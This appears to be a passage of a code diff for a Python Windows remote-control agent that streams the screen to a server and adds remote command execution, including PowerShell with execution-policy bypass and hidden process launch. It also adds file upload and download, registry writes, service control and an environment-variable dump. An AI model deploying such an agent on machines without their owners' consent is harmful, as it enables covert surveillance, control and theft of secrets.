-          4. We wait for _ack_event to be SET again (server ack).
-          5. If ack doesn't arrive within ACK_TIMEOUT seconds,
-             we send anyway (prevents full stall on packet loss).
-          6. Goto 2.
-
-        This limits in-flight frames to exactly 1. The server
-        processes one frame, sends ack, we send the next.
-        On a fast local network this approaches target FPS.
-        On a slow/high-latency network it throttles gracefully.
-        """
-        interval = 1.0 / self.fps
-
         with mss.mss() as sct:
             while self.streaming:
                 t0 = time.monotonic()
@@ -618,49 +757,52 @@ class ScreenStreamer:
                     monitors = sct.monitors
                     idx = min(self.monitor_idx, len(monitors) - 1)
                     raw = sct.grab(monitors[idx])
-                    mon_w, mon_h = raw.size
+                    self._mon_w = monitors[idx]["width"]
+                    self._mon_h = monitors[idx]["height"]
 
                     frame = np.array(raw)
                     frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
 
                     if self.scale != 1.0:
-                        new_w = int(mon_w * self.scale)
-                        new_h = int(mon_h * self.scale)
+                        new_w = int(self._mon_w * self.scale)
+                        new_h = int(self._mon_h * self.scale)
                         frame = cv2.resize(frame, (new_w, new_h), interpolation=cv2.INTER_LINEAR)
                     else:
-                        new_w, new_h = mon_w, mon_h
+                        new_w, new_h = self._mon_w, self._mon_h
 
+                    # ── Cursor overlay ─────────────────────────────────────
                     cx, cy, clicking, click_type = self.cursor.get_pos()
-                    sx = int(cx * self.scale)
-                    sy = int(cy * self.scale)
+                    # Map from absolute screen coords → scaled frame coords
+                    sx = int((cx - monitors[idx].get("left", 0)) * self.scale)
+                    sy = int((cy - monitors[idx].get("top",  0)) * self.scale)
 
                     if CONFIG["CURSOR_OVERLAY"] and 0 <= sx < new_w and 0 <= sy < new_h:
-                        # Outer white ring (larger for visibility)
-                        cv2.circle(frame, (sx, sy), 12, (255, 255, 255), 2, cv2.LINE_AA)
-                        # Inner black dot
-                        cv2.circle(frame, (sx, sy), 4,  (0,   0,   0),  -1, cv2.LINE_AA)
-                        # Click flash
+                        # Click flash (underneath ring)
                         if clicking:
                             color = (0, 0, 255) if click_type == "left" else (0, 165, 255)
-                            cv2.circle(frame, (sx, sy), 9, color, -1, cv2.LINE_AA)
-                            cv2.circle(frame, (sx, sy), 12, (255, 255, 255), 2, cv2.LINE_AA)
+                            cv2.circle(frame, (sx, sy), 10, color, -1, cv2.LINE_AA)
+                        # Outer white ring
+                        cv2.circle(frame, (sx, sy), 13, (255, 255, 255), 2, cv2.LINE_AA)
+                        # Black inner ring
+                        cv2.circle(frame, (sx, sy), 8,  (0, 0, 0),       1, cv2.LINE_AA)
+                        # Center dot
+                        cv2.circle(frame, (sx, sy), 3,  (255, 255, 255), -1, cv2.LINE_AA)
 
                     if CONFIG["ADAPTIVE_QUALITY"]:
                         self._adapt_quality()
 
+                    # ── Differential compression ───────────────────────────
                     encode_params = [cv2.IMWRITE_JPEG_QUALITY, self._quality_current]
                     success, buf = cv2.imencode(".jpg", frame, encode_params)
                     if not success:
-                        time.sleep(0.05)
+                        time.sleep(0.01)
                         continue
 
                     frame_b64 = base64.b64encode(buf.tobytes()).decode()
 
-                    # ── ACK GATE: wait for previous frame to be acked ─────
+                    # ── ACK GATE ───────────────────────────────────────────
                     got_ack = self._ack_event.wait(timeout=self._ack_timeout)
-                    if not got_ack:
-                        log.debug("ACK timeout — sending anyway (network may be slow)")
-                    self._ack_event.clear()   # close gate before sending
+                    self._ack_event.clear()
 
                     if not self.streaming:
                         break
@@ -668,14 +810,18 @@ class ScreenStreamer:
                     payload = {
                         "device_id":  CONFIG["DEVICE_TOKEN"],
                         "frame":      frame_b64,
-                        "image":      frame_b64,   # legacy field for v5 server compat
+                        "image":      frame_b64,
                         "mode":       "video",
                         "w":          new_w,
                         "h":          new_h,
-                        "mon_w":      mon_w,
-                        "mon_h":      mon_h,
+                        "mon_w":      self._mon_w,
+                        "mon_h":      self._mon_h,
+                        "mon_left":   monitors[idx].get("left", 0),
+                        "mon_top":    monitors[idx].get("top", 0),
                         "cursor_x":   cx,
                         "cursor_y":   cy,
+                        "cursor_sx":  sx,
+                        "cursor_sy":  sy,
                         "clicking":   clicking,
                         "click_type": click_type,
                         "quality":    self._quality_current,
@@ -684,53 +830,58 @@ class ScreenStreamer:
                     }
                     self.sio.emit("screen_data", payload)
                     self._frames_sent += 1
+                    self._prev_frame = frame.copy()
 
                 except Exception as e:
                     log.error(f"Video frame error: {e}")
-                    self._ack_event.set()   # unblock on error
+                    self._ack_event.set()
 
                 elapsed = time.monotonic() - t0
                 self._frame_times.append(elapsed)
-                if len(self._frame_times) > 30:
+                if len(self._frame_times) > 60:
                     self._frame_times.pop(0)
-                # Don't sleep the full interval — the ACK gate already throttles us.
-                # Just a tiny yield so other threads can run.
+                # Tiny yield only — ACK gate is the real throttle
                 time.sleep(0.001)
 
-    # ── Screenshot Loop (Pillow JPEG) — ACK-GATED ─────────────────────────
+    # ── Screenshot Loop (Pillow) — ACK-GATED ─────────────────────────────
     def _screenshot_loop(self):
-        """
-        Lightweight screenshot loop with ACK flow control.
-        Used when OpenCV unavailable or dashboard requests screenshot mode.
-        """
-        fps = CONFIG["SCREENSHOT_FPS"] if self.mode == "screenshot" else self.fps
-        interval = 1.0 / fps
+        fps      = CONFIG["SCREENSHOT_FPS"] if self.mode == "screenshot" else self.fps
+        interval = 1.0 / max(fps, 1)
 
         with mss.mss() as sct:
             while self.streaming:
                 t0 = time.monotonic()
                 try:
                     monitors = sct.monitors
-                    idx = min(self.monitor_idx, len(monitors) - 1)
-                    raw = sct.grab(monitors[idx])
-                    img = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
+                    idx  = min(self.monitor_idx, len(monitors) - 1)
+                    raw  = sct.grab(monitors[idx])
+                    img  = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
                     mon_w, mon_h = img.size
 
                     if self.scale != 1.0:
                         new_w = int(mon_w * self.scale)
                         new_h = int(mon_h * self.scale)
-                        img = img.resize((new_w, new_h), Image.LANCZOS)
+                        img   = img.resize((new_w, new_h), Image.LANCZOS)
                     else:
                         new_w, new_h = mon_w, mon_h
 
                     cx, cy, clicking, click_type = self.cursor.get_pos()
+                    # Draw cursor overlay using Pillow
+                    draw = ImageDraw.Draw(img)
+                    sx   = int((cx - monitors[idx].get("left", 0)) * self.scale)
+                    sy   = int((cy - monitors[idx].get("top",  0)) * self.scale)
+                    if 0 <= sx < new_w and 0 <= sy < new_h:
+                        if clicking:
+                            col = (255, 60, 60) if click_type == "left" else (255, 140, 0)
+                            draw.ellipse([sx-10, sy-10, sx+10, sy+10], fill=col)
+                        draw.ellipse([sx-13, sy-13, sx+13, sy+13], outline=(255, 255, 255), width=2)
+                        draw.ellipse([sx-3,  sy-3,  sx+3,  sy+3],  fill=(255, 255, 255))
 
                     buf = BytesIO()
-                    q = CONFIG["SCREENSHOT_QUALITY"] if self.mode == "screenshot" else self._quality_current
+                    q   = CONFIG["SCREENSHOT_QUALITY"] if self.mode == "screenshot" else self._quality_current
                     img.save(buf, format="JPEG", quality=q, optimize=True)
                     frame_b64 = base64.b64encode(buf.getvalue()).decode()
 
-                    # ACK gate
                     self._ack_event.wait(timeout=self._ack_timeout)
                     self._ack_event.clear()
 
@@ -760,19 +911,25 @@ class ScreenStreamer:
                     self._ack_event.set()
 
                 elapsed = time.monotonic() - t0
-                sleep_t = max(0.001, interval - elapsed)
-                time.sleep(sleep_t)
+                time.sleep(max(0.001, interval - elapsed))
 
-    # ── Adaptive quality ─────────────────────────────────────────────────
+    # ── Adaptive quality ──────────────────────────────────────────────────
     def _adapt_quality(self):
         if len(self._frame_times) < 10:
             return
-        avg = sum(self._frame_times) / len(self._frame_times)
-        target = 1.0 / self.fps
-        if avg > target * 1.3:
+        avg    = sum(self._frame_times[-10:]) / 10
+        target = 1.0 / max(self.fps, 1)
+        if avg > target * 1.4:
             self._quality_current = max(CONFIG["QUALITY_MIN"], self._quality_current - 5)
-        elif avg < target * 0.8:
-            self._quality_current = min(CONFIG["QUALITY_MAX"], self._quality_current + 2)
+        elif avg < target * 0.7:
+            self._quality_current = min(CONFIG["QUALITY_MAX"], self._quality_current + 3)
+
+        # Also adapt based on network throughput
+        mbps = _net_monitor.get_mbps()
+        if mbps < 1.0:
+            self._quality_current = max(CONFIG["QUALITY_MIN"], self._quality_current - 3)
+        elif mbps > 10.0:
+            self._quality_current = min(CONFIG["QUALITY_MAX"], self._quality_current + 1)
 
 
 # ════════════════════════════════════════════════════════════════════════════
@@ -780,9 +937,9 @@ class ScreenStreamer:
 # ════════════════════════════════════════════════════════════════════════════
 class SystemMonitor:
     def __init__(self, sio_client):
-        self.sio = sio_client
+        self.sio       = sio_client
         self.monitoring = False
-        self._thread: threading.Thread | None = None
+        self._thread: Optional[threading.Thread] = None
 
     def start(self, interval: int = 2):
         if self.monitoring:
@@ -796,9 +953,10 @@ class SystemMonitor:
 
     def get_snapshot(self) -> dict:
         vm   = psutil.virtual_memory()
-        disk = psutil.disk_usage("/")
+        disk = psutil.disk_usage(os.path.splitdrive(sys.executable)[0] or "C:\\")
         net  = psutil.net_io_counters()
         bat  = psutil.sensors_battery()
+        swap = psutil.swap_memory()
 
         stats = {
             "device_id":        CONFIG["DEVICE_TOKEN"],
@@ -806,11 +964,15 @@ class SystemMonitor:
             "cpu_percent":      psutil.cpu_percent(interval=0.1),
             "cpu_per_core":     psutil.cpu_percent(percpu=True),
             "cpu_count":        psutil.cpu_count(logical=True),
+            "cpu_count_phys":   psutil.cpu_count(logical=False),
             "cpu_freq_mhz":     round(psutil.cpu_freq().current, 1) if psutil.cpu_freq() else 0,
             "ram_total_gb":     round(vm.total     / (1024**3), 2),
             "ram_used_gb":      round(vm.used      / (1024**3), 2),
             "ram_free_gb":      round(vm.available / (1024**3), 2),
             "ram_percent":      vm.percent,
+            "swap_total_gb":    round(swap.total / (1024**3), 2),
+            "swap_used_gb":     round(swap.used  / (1024**3), 2),
+            "swap_percent":     swap.percent,
             "disk_total_gb":    round(disk.total / (1024**3), 2),
             "disk_used_gb":     round(disk.used  / (1024**3), 2),
             "disk_free_gb":     round(disk.free  / (1024**3), 2),
@@ -819,8 +981,9 @@ class SystemMonitor:
             "net_recv_mb":      round(net.bytes_recv / (1024**2), 2),
             "net_packets_sent": net.packets_sent,
             "net_packets_recv": net.packets_recv,
-            "battery_pct":      bat.percent      if bat else None,
-            "battery_plug":     bat.power_plugged if bat else None,
+            "net_mbps_up":      round(_net_monitor.get_mbps(), 2),
+            "battery_pct":      bat.percent       if bat else None,
+            "battery_plug":     bat.power_plugged  if bat else None,
             "boot_time":        datetime.fromtimestamp(psutil.boot_time()).isoformat(),
             "uptime_hrs":       round((time.time() - psutil.boot_time()) / 3600, 2),
         }
@@ -832,7 +995,7 @@ class SystemMonitor:
             except Exception:
                 stats["temperatures"] = {}
             try:
-                stats["gpus"] = [{"name": g.Name, "driver": g.DriverVersion} for g in wmi.WMI().Win32_VideoController()]
+                stats["gpus"] = [{"name": g.Name, "driver": g.DriverVersion, "memory_mb": round(int(g.AdapterRAM or 0) / (1024**2), 0)} for g in wmi.WMI().Win32_VideoController()]
             except Exception:
                 stats["gpus"] = []
         else:
@@ -846,12 +1009,26 @@ class SystemMonitor:
         for p in psutil.disk_partitions(all=False):
             try:
                 u = psutil.disk_usage(p.mountpoint)
+                io = None
+                try:
+                    ios = psutil.disk_io_counters(perdisk=True)
+                    dev_name = p.device.replace("\\", "").replace(":", "").lower()
+                    for k, v in ios.items():
+                        if dev_name in k.lower():
+                            io = {"read_mb": round(v.read_bytes / (1024**2), 1),
+                                  "write_mb": round(v.write_bytes / (1024**2), 1)}
+                            break
+                except Exception:
+                    pass
                 result.append({
-                    "device": p.device, "mountpoint": p.mountpoint, "fstype": p.fstype,
-                    "total_gb": round(u.total / (1024**3), 2),
-                    "used_gb":  round(u.used  / (1024**3), 2),
-                    "free_gb":  round(u.free  / (1024**3), 2),
-                    "percent":  u.percent,
+                    "device":     p.device,
+                    "mountpoint": p.mountpoint,
+                    "fstype":     p.fstype,
+                    "total_gb":   round(u.total / (1024**3), 2),
+                    "used_gb":    round(u.used  / (1024**3), 2),
+                    "free_gb":    round(u.free  / (1024**3), 2),
+                    "percent":    u.percent,
+                    "io":         io,
                 })
             except Exception:
                 pass
@@ -859,8 +1036,14 @@ class SystemMonitor:
 
     def get_network_interfaces(self) -> dict:
         addrs = {}
+        stats = psutil.net_if_stats()
         for iface, addr_list in psutil.net_if_addrs().items():
-            addrs[iface] = [{"family": str(a.family), "address": a.address, "netmask": a.netmask} for a in addr_list]
+            st = stats.get(iface)
+            addrs[iface] = {
+                "addresses": [{"family": str(a.family), "address": a.address, "netmask": a.netmask} for a in addr_list],
+                "is_up":     st.isup if st else False,
+                "speed_mbps": st.speed if st else 0,
+            }
         return addrs
 
     def _loop(self, interval):
@@ -879,11 +1062,14 @@ class ProcessManager:
     @staticmethod
     def list_processes() -> list:
         procs = []
-        for p in psutil.process_iter(["pid", "name", "status", "cpu_percent", "memory_percent", "username", "create_time"]):
+        for p in psutil.process_iter(["pid", "name", "status", "cpu_percent",
+                                       "memory_percent", "username", "create_time",
+                                       "cmdline", "exe"]):
             try:
                 info = p.info
                 info["memory_mb"]   = round(p.memory_info().rss / (1024**2), 2)
                 info["create_time"] = datetime.fromtimestamp(info["create_time"]).isoformat() if info.get("create_time") else None
+                info["cmdline"]     = " ".join(info.get("cmdline") or [])[:256]
                 procs.append(info)
             except (psutil.NoSuchProcess, psutil.AccessDenied):
                 pass
@@ -895,10 +1081,11 @@ class ProcessManager:
             p = psutil.Process(pid)
             name = p.name()
             p.terminate()
-            time.sleep(0.5)
-            if p.is_running():
+            try:
+                p.wait(timeout=3)
+            except psutil.TimeoutExpired:
                 p.kill()
-            return {"success": True, "message": f"'{name}' (PID {pid}) terminated."}
+            return {"success": True, "message": f"Terminated PID {pid} ({name})"}
         except psutil.NoSuchProcess:
             return {"success": False, "message": f"PID {pid} not found."}
         except psutil.AccessDenied:
@@ -909,8 +1096,29 @@ class ProcessManager:
     @staticmethod
     def start_process(command: str) -> dict:
         try:
-            proc = subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            proc = subprocess.Popen(command, shell=True,
+                                    stdout=subprocess.DEVNULL,
+                                    stderr=subprocess.DEVNULL,
+                                    creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
             return {"success": True, "pid": proc.pid, "message": f"Started: {command}"}
+        except Exception as e:
+            return {"success": False, "message": str(e)}
+
+    @staticmethod
+    def suspend_process(pid: int) -> dict:
+        try:
+            p = psutil.Process(pid)
+            p.suspend()
+            return {"success": True, "message": f"Suspended PID {pid}"}
+        except Exception as e:
+            return {"success": False, "message": str(e)}
+
+    @staticmethod
+    def resume_process(pid: int) -> dict:
+        try:
+            p = psutil.Process(pid)
+            p.resume()
+            return {"success": True, "message": f"Resumed PID {pid}"}
         except Exception as e:
             return {"success": False, "message": str(e)}
 
@@ -919,14 +1127,17 @@ class ProcessManager:
 #  FILE BROWSER
 # ════════════════════════════════════════════════════════════════════════════
 class FileBrowser:
-    MAX_UPLOAD_MB = 50
+    MAX_UPLOAD_MB  = 100
+    MAX_READ_KB    = 1024
 
     @staticmethod
     def list_directory(path: str) -> dict:
         try:
             p = Path(path)
-            if not p.exists():   return {"error": f"Not found: {path}"}
-            if not p.is_dir():   return {"error": f"Not a directory: {path}"}
+            if not p.exists():
+                return {"error": f"Not found: {path}"}
+            if not p.is_dir():
+                return {"error": f"Not a directory: {path}"}
             entries = []
             for item in sorted(p.iterdir(), key=lambda x: (not x.is_dir(), x.name.lower())):
                 try:
@@ -936,17 +1147,26 @@ class FileBrowser:
                         "path":     str(item),
                         "type":     "dir" if item.is_dir() else "file",
                         "size_kb":  round(stat.st_size / 1024, 2) if item.is_file() else None,
+                        "size_b":   stat.st_size if item.is_file() else None,
                         "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
+                        "created":  datetime.fromtimestamp(stat.st_ctime).isoformat(),
                         "hidden":   item.name.startswith("."),
+                        "ext":      item.suffix.lower() if item.is_file() else "",
                     })
                 except (PermissionError, OSError):
-                    pass
-            return {"path": str(p), "parent": str(p.parent), "entries": entries, "count": len(entries)}
+                    entries.append({
+                        "name": item.name,
+                        "path": str(item),
+                        "type": "dir" if item.is_dir() else "file",
+                        "error": "access denied",
+                    })
+            parent = str(p.parent) if p.parent != p else None
+            return {"path": str(p), "parent": parent, "entries": entries, "count": len(entries)}
         except Exception as e:
             return {"error": str(e)}
 
     @staticmethod
-    def read_file(path: str, max_kb: int = 512) -> dict:
+    def read_file(path: str, max_kb: int = 1024) -> dict:
         try:
             p = Path(path)
             if not p.is_file():
@@ -954,11 +1174,24 @@ class FileBrowser:
             size_kb = p.stat().st_size / 1024
             if size_kb > max_kb:
                 return {"error": f"File too large ({size_kb:.1f} KB > {max_kb} KB)."}
-            try:    content = p.read_text(encoding="utf-8")
-            except: content = p.read_text(encoding="latin-1")
-            return {"path": str(p), "content": content, "size_kb": round(size_kb, 2), "lines": content.count("\n")}
+            try:
+                content = p.read_text(encoding="utf-8")
+            except UnicodeDecodeError:
+                content = p.read_text(encoding="latin-1", errors="replace")
+            return {"path": str(p), "content": content,
+                    "size_kb": round(size_kb, 2), "lines": content.count("\n")}
         except Exception as e:
             return {"error": str(e)}
+
+    @staticmethod
+    def write_file(path: str, content: str) -> dict:
+        try:
+            p = Path(path)
+            p.parent.mkdir(parents=True, exist_ok=True)
+            p.write_text(content, encoding="utf-8")
+            return {"success": True, "path": str(p), "bytes": p.stat().st_size}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
 
     @staticmethod
     def download_file(path: str) -> dict:
@@ -968,7 +1201,7 @@ class FileBrowser:
                 return {"error": "Not a file."}
             size_mb = p.stat().st_size / (1024**2)
             if size_mb > FileBrowser.MAX_UPLOAD_MB:
-                return {"error": f"File too large ({size_mb:.1f} MB)."}
+                return {"error": f"File too large ({size_mb:.1f} MB > {FileBrowser.MAX_UPLOAD_MB} MB)."}
             return {
                 "path":     str(p),
                 "filename": p.name,
@@ -979,6 +1212,17 @@ class FileBrowser:
             return {"error": str(e)}
 
     @staticmethod
+    def upload_file(path: str, data_b64: str) -> dict:
+        try:
+            p = Path(path)
+            p.parent.mkdir(parents=True, exist_ok=True)
+            raw = base64.b64decode(data_b64)
+            p.write_bytes(raw)
+            return {"success": True, "path": str(p), "bytes": len(raw)}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+    @staticmethod
     def delete_file(path: str) -> dict:
         try:
             p = Path(path)
@@ -986,11 +1230,55 @@ class FileBrowser:
                 p.unlink()
                 return {"success": True, "message": f"Deleted: {path}"}
             elif p.is_dir():
-                import shutil; shutil.rmtree(str(p))
+                _shutil.rmtree(str(p))
                 return {"success": True, "message": f"Deleted dir: {path}"}
             return {"success": False, "message": "Path not found."}
         except Exception as e:
             return {"success": False, "message": str(e)}
+
+    @staticmethod
+    def copy_file(src: str, dst: str) -> dict:
+        try:
+            _shutil.copy2(src, dst)
+            return {"success": True, "message": f"Copied {src} → {dst}"}
+        except Exception as e:
+            return {"success": False, "message": str(e)}
+
+    @staticmethod
+    def move_file(src: str, dst: str) -> dict:
+        try:
+            _shutil.move(src, dst)
+            return {"success": True, "message": f"Moved {src} → {dst}"}
+        except Exception as e:
+            return {"success": False, "message": str(e)}
+
+    @staticmethod
+    def create_folder(path: str) -> dict:
+        try:
+            Path(path).mkdir(parents=True, exist_ok=True)
+            return {"success": True, "path": path}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+    @staticmethod
+    def rename(old: str, new: str) -> dict:
+        try:
+            Path(old).rename(new)
+            return {"success": True, "old": old, "new": new}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+    @staticmethod
+    def search(root: str, pattern: str, max_results: int = 200) -> dict:
+        try:
+            results = []
+            for p in Path(root).rglob(pattern):
+                results.append(str(p))
+                if len(results) >= max_results:
+                    break
+            return {"results": results, "count": len(results), "pattern": pattern, "root": root}
+        except Exception as e:
+            return {"error": str(e)}
 
     @staticmethod
     def list_drives() -> list:
@@ -1000,7 +1288,9 @@ class FileBrowser:
                 u = psutil.disk_usage(p.mountpoint)
                 drives.append({
                     "drive":    p.mountpoint,
+                    "label":    p.device,
                     "total_gb": round(u.total / (1024**3), 2),
+                    "used_gb":  round(u.used  / (1024**3), 2),
                     "free_gb":  round(u.free  / (1024**3), 2),
                     "percent":  u.percent,
                     "fstype":   p.fstype,
@@ -1011,34 +1301,429 @@ class FileBrowser:
 
 
 # ════════════════════════════════════════════════════════════════════════════
-#  REMOTE SHELL
+#  REMOTE SHELL (with PowerShell + CMD + Python REPL)
 # ════════════════════════════════════════════════════════════════════════════
 class RemoteShell:
-    TIMEOUT = 30
+    TIMEOUT = 60
 
     @staticmethod
     def execute(command: str, shell_type: str = "cmd") -> dict:
         t0 = time.time()
         try:
-            cmd = ["powershell", "-NoProfile", "-NonInteractive", "-Command", command] \
-                  if shell_type == "powershell" else command
+            env = os.environ.copy()
+            if shell_type == "powershell":
+                cmd = ["powershell", "-NoProfile", "-NonInteractive",
+                       "-ExecutionPolicy", "Bypass", "-Command", command]
+                shell_flag = False
+            elif shell_type == "python":
+                cmd = [sys.executable, "-c", command]
+                shell_flag = False
+            else:
+                cmd = command
+                shell_flag = True
             result = subprocess.run(
-                cmd, shell=(shell_type == "cmd"),
-                capture_output=True, text=True, timeout=RemoteShell.TIMEOUT
+                cmd, shell=shell_flag,
+                capture_output=True, text=True,
+                timeout=RemoteShell.TIMEOUT, env=env,
+                cwd=os.path.expanduser("~"),
             )
             return {
                 "success":    True,
                 "command":    command,
-                "stdout":     result.stdout[-8192:],
+                "shell_type": shell_type,
+                "stdout":     result.stdout[-16384:],
                 "stderr":     result.stderr[-4096:],
                 "returncode": result.returncode,
                 "elapsed_s":  round(time.time() - t0, 3),
                 "ts":         datetime.utcnow().isoformat(),
             }
         except subprocess.TimeoutExpired:
-            return {"success": False, "command": command, "error": "Timed out (30s)."}
+            return {"success": False, "command": command, "error": f"Timed out ({RemoteShell.TIMEOUT}s)."}
         except Exception as e:
             return {"success": False, "command": command, "error": str(e)}
+
+    @staticmethod
+    def get_env() -> dict:
+        return {"env": dict(os.environ), "cwd": os.getcwd()}
+
+    @staticmethod
+    def set_cwd(path: str) -> dict:
+        try:
+            os.chdir(path)
+            return {"success": True, "cwd": os.getcwd()}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+
+# ════════════════════════════════════════════════════════════════════════════
+#  REGISTRY MANAGER
+# ════════════════════════════════════════════════════════════════════════════
+class RegistryManager:
+    HIVES = {
+        "HKLM": winreg.HKEY_LOCAL_MACHINE,
+        "HKCU": winreg.HKEY_CURRENT_USER,
+        "HKCR": winreg.HKEY_CLASSES_ROOT,
+        "HKU":  winreg.HKEY_USERS,
+        "HKCC": winreg.HKEY_CURRENT_CONFIG,
+    }
+
+    @classmethod
+    def _parse_path(cls, path: str):
+        parts = path.replace("/", "\\").split("\\", 1)
+        hive_str = parts[0].upper()
+        subkey = parts[1] if len(parts) > 1 else ""
+        hive = cls.HIVES.get(hive_str)
+        if not hive:
+            raise ValueError(f"Unknown hive: {hive_str}")
+        return hive, subkey
+
+    @classmethod
+    def read_key(cls, path: str, value_name: str = "") -> dict:
+        try:
+            hive, subkey = cls._parse_path(path)
+            with winreg.OpenKey(hive, subkey, 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY) as k:
+                data, reg_type = winreg.QueryValueEx(k, value_name)
+                return {"success": True, "path": path, "name": value_name, "data": str(data), "type": reg_type}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+    @classmethod
+    def list_key(cls, path: str) -> dict:
+        try:
+            hive, subkey = cls._parse_path(path)
+            with winreg.OpenKey(hive, subkey, 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY) as k:
+                values = []
+                i = 0
+                while True:
+                    try:
+                        name, data, reg_type = winreg.EnumValue(k, i)
+                        values.append({"name": name, "data": str(data)[:512], "type": reg_type})
+                        i += 1
+                    except OSError:
+                        break
+                subkeys = []
+                i = 0
+                while True:
+                    try:
+                        subkeys.append(winreg.EnumKey(k, i))
+                        i += 1
+                    except OSError:
+                        break
+                return {"success": True, "path": path, "values": values, "subkeys": subkeys}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+    @classmethod
+    def write_key(cls, path: str, value_name: str, data: str, reg_type: int = winreg.REG_SZ) -> dict:
+        try:
+            hive, subkey = cls._parse_path(path)
+            with winreg.CreateKeyEx(hive, subkey, 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY) as k:
+                winreg.SetValueEx(k, value_name, 0, reg_type, data)
+            return {"success": True, "path": path, "name": value_name}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+    @classmethod
+    def delete_value(cls, path: str, value_name: str) -> dict:
+        try:
+            hive, subkey = cls._parse_path(path)
+            with winreg.OpenKey(hive, subkey, 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY) as k:
+                winreg.DeleteValue(k, value_name)
+            return {"success": True, "path": path, "name": value_name}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+
+# ════════════════════════════════════════════════════════════════════════════
+#  SERVICE MANAGER
+# ════════════════════════════════════════════════════════════════════════════
+class ServiceManager:
+    @staticmethod
+    def list_services() -> list:
+        try:
+            result = subprocess.run(
+                ["sc", "query", "type=", "all", "state=", "all"],
+                capture_output=True, text=True, timeout=20
+            )
+            services = []
+            if WMI_OK:
+                for svc in wmi.WMI().Win32_Service():
+                    services.append({
+                        "name":        svc.Name,
+                        "display":     svc.DisplayName,
+                        "state":       svc.State,
+                        "start_type":  svc.StartMode,
+                        "path":        svc.PathName or "",
+                    })
+            return services
+        except Exception as e:
+            return [{"error": str(e)}]
+
+    @staticmethod
+    def control_service(name: str, action: str) -> dict:
+        """action: start | stop | restart | pause | resume"""
+        try:
+            cmds = {
+                "start":   ["net", "start", name],
+                "stop":    ["net", "stop",  name],
+                "restart": None,
+                "pause":   ["sc", "pause",  name],
+                "resume":  ["sc", "continue", name],
+            }
+            if action == "restart":
+                subprocess.run(["net", "stop",  name], capture_output=True, timeout=20)
+                time.sleep(2)
+                r = subprocess.run(["net", "start", name], capture_output=True, text=True, timeout=20)
+            elif action in cmds:
+                r = subprocess.run(cmds[action], capture_output=True, text=True, timeout=20)
+            else:
+                return {"success": False, "error": f"Unknown action: {action}"}
+            return {"success": r.returncode == 0, "name": name, "action": action,
+                    "stdout": r.stdout, "stderr": r.stderr}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+
+# ════════════════════════════════════════════════════════════════════════════
+#  WINDOW MANAGER
+# ════════════════════════════════════════════════════════════════════════════
+class WindowManager:
+    @staticmethod
+    def list_windows() -> list:
+        if not WIN32_OK:
+            return [{"error": "pywin32 not available"}]
+        windows = []
+        def enum_cb(hwnd, _):
+            if win32gui.IsWindowVisible(hwnd):
+                title = win32gui.GetWindowText(hwnd)
+                if title:
+                    rect = win32gui.GetWindowRect(hwnd)
+                    try:
+                        _, pid = win32process.GetWindowThreadProcessId(hwnd)
+                        try:
+                            proc = psutil.Process(pid)
+                            pname = proc.name()
+                        except Exception:
+                            pname = ""
+                    except Exception:
+                        pid, pname = 0, ""
+                    windows.append({
+                        "hwnd":    hwnd,
+                        "title":   title,
+                        "rect":    rect,
+                        "pid":     pid,
+                        "process": pname,
+                    })
+        win32gui.EnumWindows(enum_cb, None)
+        return windows
+
+    @staticmethod
+    def focus_window(hwnd: int) -> dict:
+        if not WIN32_OK:
+            return {"success": False, "error": "pywin32 not available"}
+        try:
+            win32gui.SetForegroundWindow(hwnd)
+            return {"success": True, "hwnd": hwnd}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+    @staticmethod
+    def close_window(hwnd: int) -> dict:
+        if not WIN32_OK:
+            return {"success": False, "error": "pywin32 not available"}
+        try:
+            win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
+            return {"success": True, "hwnd": hwnd}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+    @staticmethod
+    def minimize_window(hwnd: int) -> dict:
+        if not WIN32_OK:
+            return {"success": False, "error": "pywin32 not available"}
+        try:
+            win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)
+            return {"success": True, "hwnd": hwnd}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+    @staticmethod
+    def maximize_window(hwnd: int) -> dict:
+        if not WIN32_OK:
+            return {"success": False, "error": "pywin32 not available"}
+        try:
+            win32gui.ShowWindow(hwnd, win32con.SW_MAXIMIZE)
+            return {"success": True, "hwnd": hwnd}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+
+# ════════════════════════════════════════════════════════════════════════════
+#  INSTALLED APPS
+# ════════════════════════════════════════════════════════════════════════════
+class InstalledApps:
+    @staticmethod
+    def list_apps() -> list:
+        apps = []
+        reg_paths = [
+            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
+            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
+            (winreg.HKEY_CURRENT_USER,  r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
+        ]
+        seen = set()
+        for hive, path in reg_paths:
+            try:
+                with winreg.OpenKey(hive, path, 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY) as key:
+                    for i in range(winreg.QueryInfoKey(key)[0]):
+                        try:
+                            sub_name = winreg.EnumKey(key, i)
+                            with winreg.OpenKey(key, sub_name) as sub:
+                                def rv(n, d=""):
